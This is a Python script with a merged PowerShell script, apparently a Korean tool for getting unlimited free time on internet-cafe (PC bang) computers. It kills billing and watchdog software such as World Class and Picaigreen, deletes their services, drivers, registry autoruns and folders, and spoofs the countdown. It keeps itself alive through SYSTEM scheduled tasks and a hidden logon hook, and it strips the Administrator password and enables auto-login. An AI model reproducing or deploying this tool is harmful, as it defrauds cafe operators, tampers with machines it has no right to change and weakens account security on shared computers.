    for hive, regpath, name in t["run"]:
        if reg_get(hive, regpath, name) is not None:
            reg_del(hive, regpath, name)
    for exe in t["exe"]:
        if os.path.exists(exe) and not os.path.exists(exe + ".off"):
            try:
                os.rename(exe, exe + ".off")
            except OSError:
                pass
    for lnk in t["startup"]:
        if lnk and os.path.exists(lnk) and not os.path.exists(lnk + ".off"):
            try:
                os.rename(lnk, lnk + ".off")
            except OSError:
                pass
    hide_worldclass_exes()
    neutralize_watchdogs()
    disable_proxy()


def disable_power_off():
    run(["powercfg.exe", "/change", "standby-timeout-ac", "0"])
    run(["powercfg.exe", "/change", "hibernate-timeout-ac", "0"])
    run(["powercfg.exe", "/change", "monitor-timeout-ac", "0"])
    run(["powercfg.exe", "/change", "disk-timeout-ac", "0"])
    for group, setting in POWER_SETTINGS:
        run(["powercfg.exe", "/setacvalueindex", "SCHEME_CURRENT", group, setting, "0"])
    run(["powercfg.exe", "/setactive", "SCHEME_CURRENT"])
    try:
        reg_set("HKCU", r"Control Panel\Desktop", "ScreenSaveActive", "0")
    except OSError:
        pass


def hide_worldclass_exes():
    roots = [
        r"C:\Program Files\WCCustomer",
        r"C:\Users\Administrator\AppData\Roaming\world-class-user",
        r"C:\Users\Administrator\AppData\Local\Programs\world-class-user",
    ]
    names = {"WCCustomer.exe", "WCCST.exe", "WCCST_D.exe", "wcwatch.exe", "chost.exe"}
    for root in roots:
        if not os.path.isdir(root):
            continue
        for dirpath, _dirs, files in os.walk(root):
            for fname in files:
                if fname not in names:
                    continue
                path = os.path.join(dirpath, fname)
                if not os.path.exists(path + ".off"):
                    try:
                        os.rename(path, path + ".off")
                    except OSError:
                        pass


def kill_watchdog_loops():
    rc, out = run(["powershell.exe", "-NoProfile", "-Command",
                   "Get-CimInstance Win32_Process -Filter \"Name='cmd.exe'\" | "
                   "ForEach-Object { $_.CommandLine + '|' + $_.ProcessId }"],
                  timeout=30)
    if rc != 0:
        return
    for line in out.splitlines():
        if "|" not in line:
            continue
        cmd, pid = line.rsplit("|", 1)
        cmd = cmd.lower()
        pid = pid.strip()
        if not pid.isdigit():
            continue
        if ((".tmp" in cmd and ".bat" in cmd) or "wccst" in cmd
                or "wccustomer" in cmd or "bigpicture" in cmd):
            try:
                os.kill(int(pid), 9)
            except Exception:
                pass


def neutralize_watchdogs():
    try:
        reg_set("HKCU", r"Software\Bigpicture\WCManager", "UpdateInProgress", "true")
    except OSError:
        pass
    kill_watchdog_loops()
    for pid in list_pids():
        path = proc_path(pid)
        if path and os.path.basename(path).lower() == "shutdown.exe":
            try:
                os.kill(pid, 9)
            except Exception:
                pass


def pythonw():
    exe = sys.executable
    cand = os.path.join(os.path.dirname(exe), "pythonw.exe")
    return cand if os.path.exists(cand) else exe


def install_guard():
    os.makedirs(GUARD_DIR, exist_ok=True)
    target = BOOT_SCRIPT if os.path.exists(BOOT_SCRIPT) else SCRIPT
    with open(GUARD_CMD, "w", encoding="cp949") as fh:
        fh.write("@echo off\r\n")
        fh.write(f'"{pythonw()}" "{target}" guard\r\n')
    for name, schedule in ((GUARD_TASK, ["/SC", "MINUTE", "/MO", "1"]),
                           (GUARD_TASK_LOGON, ["/SC", "ONLOGON"]),
                           (GUARD_TASK_BOOT, ["/SC", "ONSTART"])):
        run(["schtasks.exe", "/Create", "/TN", name, "/TR", GUARD_CMD,
             "/RU", "SYSTEM", "/RL", "HIGHEST", "/F"] + schedule, timeout=60)
    # persistent countdown spoofer
    spoof_cmd = f'"{pythonw()}" "{target}" spoof-live'
    run(["schtasks.exe", "/Create", "/TN", "PCBangFreeSpoof", "/TR", spoof_cmd,
         "/RU", "SYSTEM", "/RL", "HIGHEST", "/F", "/SC", "ONLOGON"], timeout=60)


def remove_guard():
    for name in (GUARD_TASK, GUARD_TASK_LOGON, GUARD_TASK_BOOT, "PCBangFreeSpoof"):
        run(["schtasks.exe", "/Delete", "/TN", name, "/F"])


def guard_loop():
    try:
        saved = load_targets()
        base = saved if saved else base_targets()
        extra = discover_targets(verbose=False)
        merged = merge_targets(base, extra)
        save_targets(merged)
    except Exception:
        pass
    kill_targets()
    disable_persistence()
    hide_worldclass_exes()
    neutralize_watchdogs()
    disable_proxy()


def cmd_scan():
    print()
    print("=== 자동 탐지 (변경 없음) ===")
    extra = discover_targets(verbose=True)
    merged = merge_targets(base_targets(), extra)
    print()
    print("  -- 적용 시 대상 --")
    print("     프로세스 : " + (", ".join(merged["process"]) if merged["process"] else "없음"))
    print("     서비스   : " + (", ".join(merged["services"]) if merged["services"] else "없음"))
    print("     작업     : " + (", ".join(merged["tasks"]) if merged["tasks"] else "없음"))
    print("     Run 값   : " + (", ".join(r[2] for r in merged["run"]) if merged["run"] else "없음"))
    print("     실행파일 : " + (", ".join(os.path.basename(x) for x in merged["exe"]) if merged["exe"] else "없음"))
    print("     시작폴더 : " + (", ".join(os.path.basename(x) for x in merged["startup"] if x) if merged["startup"] else "없음"))
    print()
    return 0


def cmd_apply():
    print()
    print("=== PC방 PC 무제한 적용 ===")
    if not is_admin():
        elevate()
        return 1
    os.makedirs(ROOT, exist_ok=True)

    step("자동 탐지 (종료 API 사용 프로세스 + 자동시작 경로)")
    extra = discover_targets(verbose=True)
    merged = merge_targets(base_targets(), extra)
    save_targets(merged)
    ok(f"대상 확정: 프로세스 {len(merged['process'])}개 / 서비스 {len(merged['services'])}개 "
       f"/ 작업 {len(merged['tasks'])}개 / Run {len(merged['run'])}개")

    step("설정 백업")
    path = make_backup()
    ok(f"백업: {path}")

    step("종료 실행자 정지")
    killed = kill_targets()
    ok("종료: " + ", ".join(killed) if killed else "실행 중인 대상 없음")

    step("자동 부활 경로 차단 (서비스/작업/Run/시작폴더/실행파일)")
    disable_persistence()
    ok("차단 완료")

    step("감시자/워치독 중화 (월드클래스 등)")
    hide_worldclass_exes()
    neutralize_watchdogs()
    disable_proxy()
    ok("워치독 중화 완료")

    step("윈도우 자동 꺼짐 차단 (절전/최대절전/모니터/디스크)")
    disable_power_off()
    ok("전원 설정 고정")

    step("수동 프록시 비활성화 (인터넷/스피커 연결 보호)")
    disable_proxy()
    ok("프록시 비활성화 완료")

    step("부활 감시 작업 등록 (로그온 + 1분 주기, SYSTEM)")
    install_guard()
    ok(f"작업 등록: {GUARD_TASK} (로그온 + 1분 주기, SYSTEM)")

    time.sleep(2)
    kill_targets()

    print()
    print("??: PASS (??/?? ??? ??)")
    return 0


def cmd_verify():
    print("=== 검증 ===")
    if not is_admin():
        warn("관리자 권한이 없어 일부 항목을 확인하지 못할 수 있습니다.")
    fail = 0
    tg = targets()

    running = tasklist_names()
    alive = list(tg["process"]) if running is None else [p for p in tg["process"] if p.lower() in running]
    if alive:
        warn("남아있는 대상 프로세스: " + ", ".join(alive))
        fail += 1
    else:
        ok("종료 실행 주체 없음")

    bad = [s for s in tg["services"] if service_mode(s) not in (None, "Disabled")]
    if bad:
        warn("자동시작 남음: " + ", ".join(bad))
        fail += 1
    else:
        ok("서비스 자동시작 차단됨")

    bad = []
    for t in tg["tasks"]:
        st = task_state(t)
        if st is not None and "Disabled" not in st and "사용 안 함" not in st:
            bad.append(t)
    if bad:
        warn("활성 작업 남음: " + ", ".join(bad))
        fail += 1
    else:
        ok("작업 스케줄러 차단됨")

    bad = [n for h, p, n in tg["run"] if reg_get(h, p, n) is not None]
    if bad:
        warn("Run 값 남음: " + ", ".join(bad))
        fail += 1
    else:
        ok("Run 키 차단됨")

    bad = []
    for group, setting in POWER_SETTINGS:
        rc, out = run(["powercfg.exe", "/query", "SCHEME_CURRENT", group, setting])
        if "0x00000000" not in out:
            bad.append(f"{group}/{setting}")
    if bad:
        warn("전원 타임아웃 남음: " + ", ".join(bad))
        fail += 1
    else:
        ok("절전/화면/디스크 자동 꺼짐 없음")

    rc, out = run(["powershell.exe", "-NoProfile", "-Command",
                   "(Get-WinEvent -FilterHashtable @{LogName='System';ID=1074,1076,6006,6008,41,42;"
                   "StartTime=(Get-CimInstance Win32_OperatingSystem).LastBootUpTime} "
                   "-ErrorAction SilentlyContinue | Measure-Object).Count"], timeout=60)
    count = out.strip().splitlines()[-1] if out.strip() else "1"
    if count.strip() in ("", "0"):
        ok("이번 부팅 중 종료/재시작 이벤트 없음")
    else:
        warn("이번 부팅 중 종료/재시작 이벤트 " + count.strip() + "건")

    print()
    if fail == 0:
        print("결과: PASS (시간 만료로 꺼질 주체가 없음)")
        return 0
    print(f"결과: 확인 필요 {fail}건")
    return 2


def cmd_status():
    print()
    print("=== 현재 상태 ===")
    try:
        tick = ctypes.windll.kernel32.GetTickCount64()
        boot = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(time.time() - tick / 1000))
    except Exception:
        boot = "(알 수 없음)"
    print(f"  시각     : {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"  부팅     : {boot}")

    tg = targets()
    running = tasklist_names()
    alive = list(tg["process"]) if running is None else [p for p in tg["process"] if p.lower() in running]
    print("  대상프로세스 : " + (", ".join(alive) if alive else "없음"))
    print("  대상 정의    : " + ("자동 탐지 포함 (" + TARGETS_FILE + ")" if tg.get("discovered") else "기본 목록"))

    for name in tg["services"]:
        mode = service_mode(name)
        if mode:
            print(f"  서비스 {name:<22}: {service_state(name)} / {mode}")
    for name in tg["tasks"]:
        st = task_state(name)
        if st:
            print(f"  작업   {name:<22}: {st}")
    st = task_state(GUARD_TASK)
    print(f"  감시작업 {GUARD_TASK:<21}: {st or '없음'}")

    last = None
    if os.path.isdir(BACKUP_ROOT):
        dirs = sorted(os.listdir(BACKUP_ROOT))
        if dirs:
            last = os.path.join(BACKUP_ROOT, dirs[-1])
    print("  백업     : " + (last or "없음"))
    boot_installed = os.path.exists(HOOK_VBS) and os.path.exists(BOOT_SCRIPT)
    print("  로그온훅 : " + ("설치됨 (" + HOOK_VBS + ")" if boot_installed else "없음"))
    print()


def cmd_restore():
    print()
    print("=== 원상 복구 ===")
    if not is_admin():
        elevate()
        return 1
    if not os.path.isdir(BACKUP_ROOT):
        warn("백업이 없습니다.")
        return 1
    dirs = sorted(os.listdir(BACKUP_ROOT))
    if not dirs:
        warn("백업이 없습니다.")
        return 1
    path = os.path.join(BACKUP_ROOT, dirs[-1])
    step(f"백업 사용: {path}")
    with open(os.path.join(path, "manifest.json"), encoding="utf-8") as fh:
        manifest = json.load(fh)

    remove_guard()
    ok("감시 작업 제거")

    for item in manifest.get("files", []):
        if os.path.exists(item["renamed"]):
            try:
                os.rename(item["renamed"], item["path"])
            except OSError:
                pass
    ok("실행파일/바로가기 복원")

    for item in manifest.get("run", []):
        try:
            reg_set(item["hive"], item["path"], item["name"], item["value"])
        except OSError:
            pass
    ok("자동시작 레지스트리 복원")

    for item in manifest.get("tasks", []):
        run(["schtasks.exe", "/Change", "/TN", item["name"], "/ENABLE"])
    for item in manifest.get("services", []):
        mode = "auto" if item["mode"] == "Auto" else "demand"
        run(["sc.exe", "config", item["name"], "start=", mode])
    ok("서비스/작업 복원")

    for key, value in manifest.get("power", {}).items():
        group, setting = key.split("/")
        try:
            run(["powercfg.exe", "/setacvalueindex", "SCHEME_CURRENT", group, setting, str(int(value, 16))])
        except ValueError:
            pass
    run(["powercfg.exe", "/setactive", "SCHEME_CURRENT"])
    try:
        reg_set("HKCU", r"Control Panel\Desktop", "ScreenSaveActive", "1")
    except OSError:
        pass
    ok("전원 설정 복원")
    print()
    return 0


def cmd_install_boot():
    print()
    print("=== D: 설치 + 로그온 자동 실행 ===")
    if not is_admin():
        elevate()
        return 1
    os.makedirs(BOOT_DIR, exist_ok=True)
    if os.path.abspath(SCRIPT) != os.path.abspath(BOOT_SCRIPT):
        shutil.copy2(SCRIPT, BOOT_SCRIPT)
    ok(f"스크립트 복사: {BOOT_SCRIPT}")

    os.makedirs(HOOK_DIR, exist_ok=True)
    script_text = (
        'Set sh = CreateObject("WScript.Shell")\r\n'
        f'sh.Run """{pythonw()}"" ""{BOOT_SCRIPT}"" run", 0, False\r\n'
    )
    with open(HOOK_VBS, "w", encoding="cp949") as fh:
        fh.write(script_text)
    ok(f"로그온 훅 생성: {HOOK_VBS}")
    cmd_auto_login()
    print()
    print("  D:\\Util\\Enter\\Enter.bat 가 로그온 때 추가_실행 폴더를 자동 실행하므로")
    print("  C: 가 초기화되는 매장에서도 재부팅 후 자동 적용됩니다.")
    print()
    return 0


def cmd_remove_boot():
    print()
    print("=== 로그온 자동 실행 해제 ===")
    if not is_admin():
        elevate()
        return 1
    if os.path.exists(HOOK_VBS):
        os.remove(HOOK_VBS)
        ok(f"삭제: {HOOK_VBS}")
    else:
        ok("로그온 훅 없음")
    print()
    return 0



def cmd_auto_login():
    print()
    print("=== 자동 로그인 설정 ===")
    if not is_admin():
        elevate()
        return 1
    run(["net.exe", "user", "Administrator", "/passwordreq:no"])
    wl = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    for name, val in (("AutoAdminLogon", "1"), ("DefaultUserName", "Administrator"),
                      ("DefaultPassword", ""), ("DefaultDomainName", os.environ.get("COMPUTERNAME", ""))):
        try:
            reg_set("HKLM", wl, name, val)
        except OSError:
            pass
    ok("자동 로그인 설정 완료 (재부팅 시 자동 로그인)")
    print()
    return 0

COMMANDS = {
    "run": cmd_apply,
    "apply": cmd_apply,
    "guard": None,
    "help": None,
    "-h": None,
    "--help": None,
}



def setup_console():
    try:
        ctypes.windll.kernel32.SetConsoleOutputCP(65001)
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass


def main():
    setup_console()
    args = sys.argv[1:]
    if not args:
        print(DOC)
        return 0
    cmd = args[0]
    if cmd == "guard":
        guard_loop()
        return 0
    if cmd not in COMMANDS:
        print(f"알 수 없는 명령: {cmd}")
        print("사용: run | status | verify | restore | install-boot | remove-boot | 설명")
        return 1
    if COMMANDS[cmd] is None:
        print(DOC)
        return 0
    return COMMANDS[cmd]()


if __name__ == "__main__":
    sys.exit(main())


# ==============================================================================
# 통합: 피시.ps1 (PC방 무제한 스크립트)
# 출처: C:\Defi\피시.ps1 -> C:\Defi\피시방.py
# 원본 피시.ps1 전체 소스를 본 파일에 병합 포함함.
# ==============================================================================
PS1_SOURCE = r"""
# Permanent stop: kill all Pica/PcCafe/World Class/PFGamePot/HyperOTT(NsmPlayer)/DAK.GG processes WITHOUT shutting down the PC.
# CRITICAL: World Class shutdown protection triggers PC power-off when WCCustomer dies
# while its watchdogs (wchwmon, WCCST) are still alive. Therefore watchdogs MUST be
# killed FIRST and fully before any WCCustomer process is touched.
# No sleeps between kill steps to prevent watchdog respawn windows.
# Also kills all revival/resurrection mechanisms: watchdogs, services, kernel drivers,
# registry Run/RunOnce, scheduled tasks, startup shortcuts.

$processPatterns = 'PicaClient|Picaigreen|PcCafeMonitor|WCGuard|wchwmon|wcwatch|WCCustomer|WorldClass|world-class-user|WCCST|WorldClassClient|WorldClassServer|WorldClassManager|wcworldclass|WCWorldClass|월드클래스|피시\.ps1|PFGamePot|GamePot|PF|PFGameDisk|PFGameSync|PFCms|PFControlMgr|PFDesktopClient|PFHardwardHelper|DesktopAgent|NsmPlayer|HyperOTT|Nsm|muplayer|DAK\.GG|iGreensys|PicaigreenClient|picaigreenClient|picaigreenRun|picaigreenupC|picaigreenDownC|CounterIPSet|igreenup|AutoStarter|snetcfg|Setup_DriverSigning|NBMS|BarClient|BarMonitor|BarRemote|WmClt|WMCLT|GameHub|Launcher|DisklessStart|P2PSync|VideoSet|SSDSyncer|Nexon|게토|Geto|ohm|playdonut|wico'
$processNamePatterns = '^(pm|AutoStart|CraftBox|picaigreen|PicaClient|WCGuard|wchwmon|wcwatch|WCCustomer|WCCST|wcguard-service|WorldClassClient|WorldClassServer|WorldClassManager|wcworldclass|WCWorldClass|월드클래스|PFGamePot|PFCms|PFControlMgr|PFDesktopClient|PFHardwardHelper|PFGameDisk|PFGameSyncAgent|PFGameSyncMgr|DesktopAgent|NsmPlayer2|muplayer|DAK\.GG|iGreensys|PicaigreenClient|picaigreenClient|picaigreenRun|picaigreenupC|picaigreenDownC|CounterIPSet|igreenup|AutoStarter|snetcfg|Setup_DriverSigning|BarClientView|BarMonitor|BarRemoteSrv|BarClientTask|WmClt|WMCLTSVC|GameHub|Launcher Start|DisklessStart|P2PSyncService|VideoSet|SSDSyncer|게토|Geto|ohm|playdonut_hm)$'
$watchdogNames = @('wchwmon','WCCST','WCGuard','wcwatch','wcguard-service','PFControlMgr','PFHardwardHelper','PFGameSyncMgr','DesktopAgent','NsmPlayer2','muplayer','DAK.GG','iGreensys','picaigreenRun','picaigreenupC','picaigreenDownC','CounterIPSet','igreenup','AutoStarter','snetcfg','Setup_DriverSigning','BarClientView','BarMonitor','BarRemoteSrv','BarClientTask','WmClt','WMCLTSVC','GameHub','Launcher Start','DisklessStart','P2PSyncService','VideoSet','SSDSyncer','게토','Geto','ohm','playdonut_hm')
$customerNames = @('WCCustomer','WorldClassClient','WorldClassServer','WorldClassManager','PFGamePot','PFCms','PFDesktopClient','PFGameDisk','PFGameSyncAgent','NsmPlayer2','muplayer','DAK.GG','PicaigreenClient','picaigreenClient','iGreensys','BarClientView','BarMonitor','BarRemoteSrv','BarClientTask','WmClt','WMCLTSVC','GameHub','Launcher Start','DisklessStart','P2PSyncService','VideoSet','SSDSyncer','게토','Geto','ohm','playdonut_hm')

function Kill-ByName($name) {
    Get-Process -Name $name -ErrorAction SilentlyContinue | ForEach-Object {
        try { Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue; Write-Host "Killed: $($_.Name) ($($_.Id))" } catch {}
    }
}

function Kill-ByPathPattern() {
    Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -and ($_.Path -match $processPatterns) } | ForEach-Object {
        try { Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue; Write-Host "Killed(path): $($_.Name) ($($_.Id))" } catch {}
    }
}

# ============================================================
# STEP 1: Kill ALL watchdogs FIRST (so client death does NOT trigger PC shutdown)
# Rapid multi-pass, no sleeps between passes
# ============================================================
Write-Host "[1/9] Removing watchdogs before touching client processes..."
for ($i = 0; $i -lt 5; $i++) {
    foreach ($wd in $watchdogNames) { Kill-ByName $wd }
    Kill-ByPathPattern
}
Write-Host "Watchdog pass complete."

# ============================================================
# STEP 2: Kill client processes immediately after watchdogs are down
# ============================================================
Write-Host "[2/9] Removing client processes..."
for ($i = 0; $i -lt 5; $i++) {
    foreach ($c in $customerNames) { Kill-ByName $c }
    Kill-ByPathPattern
}
Write-Host "Client pass complete."

# ============================================================
# STEP 3: Delete installation/runtime folders IMMEDIATELY so nothing can restart
# ============================================================
Write-Host "[3/9] Deleting installation/runtime folders..."

$foldersToDelete = @(
    "C:\Users\Administrator\AppData\Roaming\world-class-user\runtime",
    "H:\GamePot_Client",
    "H:\PFGameSync_Client",
    "C:\PFGameDisk",
    "H:\DATA\HyperOTT",
    "H:\DATA\DAK.GG",
    "C:\Users\Administrator\AppData\Local\Programs\DAK.GG",
    "C:\Users\Administrator\AppData\Roaming\DAK.GG",
    "C:\Program Files (x86)\Picaigreen20Client",
    "C:\Program Files (x86)\PicaClient",
    "B:\NBMSClient",
    "B:\bClient",
    "C:\Launcher",
    "C:\Program Files (x86)\Mobilnet\Wm\WmClt",
    "Y:\wico"
)

foreach ($folder in $foldersToDelete) {
    if (Test-Path $folder) {
        try {
            Get-ChildItem -Path $folder -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
                try { Stop-Process -Id (Get-Process -FilePath $_.FullName -ErrorAction SilentlyContinue).Id -Force -ErrorAction SilentlyContinue } catch {}
            }
            Remove-Item -Path $folder -Recurse -Force -ErrorAction SilentlyContinue
            Write-Host "Deleted folder: $folder"
        } catch {
            Write-Host "Could not delete folder (files in use): $folder"
        }
    }
}

# ============================================================
# STEP 4: Final process sweep - kill any remaining related processes
# ============================================================
Write-Host "[4/9] Final process sweep..."
$all = Get-Process -ErrorAction SilentlyContinue
foreach ($p in $all) {
    $kill = $false
    if ($p.Path -and ($p.Path -match $processPatterns)) { $kill = $true }
    if ($p.Name -match $processNamePatterns) { $kill = $true }
    if ($kill) {
        try { Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue; Write-Host "Final kill: $($p.Name) ($($_.Id))" } catch {}
    }
}

# ============================================================
# STEP 5: Stop and permanently disable/delete services + kernel drivers
# ============================================================
Write-Host "[5/9] Removing services and kernel drivers..."
$services = @('MWMiniflt','pmsys','igreensys','WCGuard','wchwmon','wcwatch','WorldClassClient','WorldClassServer','WorldClassManager','wcworldclass','WCWorldClass','PFGamePot','PFCms','PFControlMgr','PFDesktopClient','PFHardwardHelper','PFGameDisk','PFGameSyncAgent','PFGameSyncMgr','DesktopAgent','R0PFHardwardHelper','PFGameDiskPNP','NsmPlayer2','muplayer','DAK.GG','igreensys','BarRemote2','WMCLTSVC','Nexon Launcher','P2PSyncService','ohm','playdonut_hm')
foreach ($s in $services) {
    $svc = Get-Service -Name $s -ErrorAction SilentlyContinue
    if ($svc) {
        if ($svc.Status -eq 'Running') {
            try { Stop-Service -Name $s -Force -ErrorAction SilentlyContinue } catch {}
            try { sc.exe stop $s 2>&1 | Out-Null } catch {}
        }
        try { Set-Service -Name $s -StartupType Disabled -ErrorAction SilentlyContinue } catch {}
        try { sc.exe config $s start= disabled 2>&1 | Out-Null } catch {}
        try { sc.exe delete $s 2>&1 | Out-Null } catch {}
        Write-Host "Service/driver removed: $s"
    }
}

# ============================================================
# STEP 6: Remove registry Run/RunOnce entries (all hives/paths) - blocks revival on boot
# ============================================================
Write-Host "[6/9] Removing registry auto-start entries (revival block)..."
$targetNames = @('AutoRun','picaigreen','picaigreenRun','PcCafeMonitorClient','PicaClient','igreen','WCGuard','wchwmon','wcwatch','WCCustomer','wcguard-service','WCCST','WorldClass','world-class-user','WorldClassClient','WorldClassServer','WorldClassManager','wcworldclass','WCWorldClass|월드클래스','PFGamePot','PFCms','PFControlMgr','PFDesktopClient','PFHardwardHelper','PFGameDisk','PFGameSyncAgent','PFGameSyncMgr','DesktopAgent','GamePot','NsmPlayer','HyperOTT','Nsm','muplayer','DAK.GG','electron.app.DAK.GG','DisklessStart','Launcher Start','BarClientTask','WMCLT','BarRemote2','WMCLTSVC','Nexon Launcher','게토','Geto','ohm','playdonut_hm','wico')
function Is-TargetName($name) {
    foreach ($t in $targetNames) {
        if ($name -eq $t) { return $true }
        if ($name -like "*$t*") { return $true }
    }
    return $false
}
function Is-TargetValue($value) {
    if (-not $value) { return $false }
    return $value -match 'PicaClient|Picaigreen|PcCafeMonitor|igreen|WCGuard|wchwmon|wcwatch|WCCustomer|WorldClass|world-class-user|WCCST|WorldClassClient|WorldClassServer|WorldClassManager|wcworldclass|WCWorldClass|월드클래스|피시\.ps1|PFGamePot|PFCms|PFControlMgr|PFDesktopClient|PFHardwardHelper|PFGameDisk|PFGameSyncAgent|PFGameSyncMgr|DesktopAgent|GamePot|NsmPlayer|HyperOTT|Nsm|muplayer|DAK\.GG|NBMS|BarClient|BarMonitor|BarRemote|WmClt|WMCLT|GameHub|Launcher|DisklessStart|P2PSync|VideoSet|SSDSyncer|Nexon|게토|Geto|ohm|playdonut|wico'
}

$runKeys = @(
    @{ Hive='HKCU'; Path='HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' },
    @{ Hive='HKCU_RunOnce'; Path='HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce' },
    @{ Hive='HKLM'; Path='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' },
    @{ Hive='HKLM_RunOnce'; Path='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce' },
    @{ Hive='HKLM_WOW64'; Path='HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run' },
    @{ Hive='HKLM_WOW64_RunOnce'; Path='HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce' },
    @{ Hive='HKU18'; Path='Registry::HKEY_USERS\S-1-5-18\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' },
    @{ Hive='HKUDef'; Path='Registry::HKEY_USERS\.DEFAULT\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' }
)
Get-ChildItem 'Registry::HKEY_USERS' -ErrorAction SilentlyContinue | ForEach-Object {
    $p = Join-Path $_.PSPath 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
    if (Test-Path $p) { $runKeys += @{ Hive="HKU_$($_.PSChildName)"; Path=$p } }
    $p2 = Join-Path $_.PSPath 'SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce'
    if (Test-Path $p2) { $runKeys += @{ Hive="HKU_$($_.PSChildName)_RunOnce"; Path=$p2 } }
}

foreach ($rk in $runKeys) {
    if (-not (Test-Path $rk.Path)) { continue }
    $props = Get-ItemProperty -Path $rk.Path -ErrorAction SilentlyContinue
    if (-not $props) { continue }
    foreach ($prop in $props.PSObject.Properties) {
        if ($prop.Name -match '^PS') { continue }
        if (Is-TargetName $prop.Name -or Is-TargetValue $prop.Value) {
            Remove-ItemProperty -Path $rk.Path -Name $prop.Name -ErrorAction SilentlyContinue
            Write-Host "Removed registry: $($rk.Hive)\$($prop.Name)"
        }
    }
}

# ============================================================
# STEP 7: Delete scheduled tasks + startup shortcuts (revival block)
# ============================================================
Write-Host "[7/9] Removing scheduled tasks and startup shortcuts..."

Get-ScheduledTask -ErrorAction SilentlyContinue | ForEach-Object {
    $task = $_
    $match = $false
    foreach ($a in $task.Actions) {
        if ($a.Execute -match $processPatterns -or $a.Arguments -match $processPatterns) { $match = $true }
    }
    if ($match) {
        try { Unregister-ScheduledTask -TaskName $task.TaskName -TaskPath $task.TaskPath -Confirm:$false -ErrorAction SilentlyContinue; Write-Host "Removed scheduled task: $($task.TaskPath)$($task.TaskName)" } catch {}
    }
}

$startupFolders = @(
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
    "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
)
foreach ($folder in $startupFolders) {
    if (-not (Test-Path $folder)) { continue }
    Get-ChildItem -Path $folder -Filter *.lnk -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            $sh = New-Object -ComObject WScript.Shell
            $sc = $sh.CreateShortcut($_.FullName)
            if ($sc.TargetPath -match $processPatterns) {
                Remove-Item -LiteralPath $_.FullName -Force -ErrorAction SilentlyContinue
                Write-Host "Removed startup shortcut: $($_.FullName)"
            }
        } catch {}
    }
}

$shortcutPaths = @(
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\DAK.GG.lnk",
    "$env:USERPROFILE\Desktop\DAK.GG.lnk",
    "H:\DATA\Desktop\DAK.GG.lnk"
)
foreach ($sp in $shortcutPaths) {
    if (Test-Path $sp) {
        try { Remove-Item -LiteralPath $sp -Force -ErrorAction SilentlyContinue; Write-Host "Deleted shortcut: $sp" } catch {}
    }
}

# ============================================================
# STEP 8: Final confirmation sweep
# ============================================================
Write-Host "[8/9] Final confirmation sweep..."
$all2 = Get-Process -ErrorAction SilentlyContinue
foreach ($p in $all2) {
    $kill = $false
    if ($p.Path -and ($p.Path -match $processPatterns)) { $kill = $true }
    if ($p.Name -match $processNamePatterns) { $kill = $true }
    if ($kill) {
        try { Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue; Write-Host "Confirmed kill: $($p.Name) ($($_.Id))" } catch {}
    }
}

# ============================================================
# STEP 9: Second folder sweep (catch anything recreated)
# ============================================================
Write-Host "[9/9] Second folder sweep..."
foreach ($folder in $foldersToDelete) {
    if (Test-Path $folder) {
        try {
            Get-ChildItem -Path $folder -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
                try { Stop-Process -Id (Get-Process -FilePath $_.FullName -ErrorAction SilentlyContinue).Id -Force -ErrorAction SilentlyContinue } catch {}
            }
            Remove-Item -Path $folder -Recurse -Force -ErrorAction SilentlyContinue
            Write-Host "Deleted folder (second pass): $folder"
        } catch {}
    }
}

Write-Host "Done. All Pica/PcCafe/World Class/PFGamePot/HyperOTT(NsmPlayer)/DAK.GG processes and revival mechanisms permanently disabled. PC was NOT shut down."
"""
